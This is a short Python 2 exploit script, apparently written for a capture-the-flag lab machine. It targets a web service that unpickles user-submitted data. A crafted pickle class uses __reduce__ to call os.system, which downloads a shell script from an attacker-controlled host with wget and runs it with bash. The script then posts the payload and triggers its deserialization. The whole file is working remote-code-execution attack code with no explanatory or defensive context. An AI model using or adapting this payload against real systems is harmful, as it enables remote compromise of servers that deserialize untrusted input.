#!/usr/bin/env python2
import cPickle
import requests
import os
from hashlib import md5

submit = "http://10.10.10.70/submit"
check = "http://10.10.10.70/check"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0"
test = {"character": "Bart", "quote": " "}


class Exploit(object):
    def __reduce__(self):
        return (os.system, (
            "wget -O /var/tmp/bart.sh http://10.10.15.69:8000/bart.sh; bash /var/tmp/bart.sh;",
        ))


def test_local():
    char = cPickle.dumps(Exploit())
    quote = "\n"
    p_id = md5(char + quote).hexdigest()
    path = "/tmp/" + p_id + ".p"
    with open(path, "wb") as outfile:
        outfile.write(char + quote)
    item = cPickle.loads(open(path, "rb").read())
    print("Still reviewing: " + item)
    print("Test Done!")


with requests.Session() as s:
    s.headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    r = s.post(submit, data=test)
    assert ("Thank you for your" in r.text)
    h = md5(test["character"] + test["quote"]).hexdigest()
    r = s.post(check, data={"id": h})
    print(r.text)

    print("-------------- EXPLOIT -------------------------------------------")
    char = cPickle.dumps(Exploit())
    quote = "\n"
    h = md5(char + quote).hexdigest()
    data = {"character": char, "quote": quote}
    r = s.post(submit, data=data)
    assert ("Thank you for your" in r.text)
    r = s.post(check, data={"id": h})
    print(r.text)
